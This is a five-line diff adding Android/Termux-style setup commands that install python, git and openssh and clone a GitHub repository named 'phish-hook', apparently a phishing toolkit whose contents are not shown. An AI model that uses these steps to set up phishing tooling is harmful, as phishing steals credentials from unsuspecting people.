@@ -1,0 +1,5 @@
+ apt update && apt upgrade
+ pkg install python
+ pkg install git
+ pkg install openssh
+ git clone https://github.com/gitoo1z/phish-hook.git
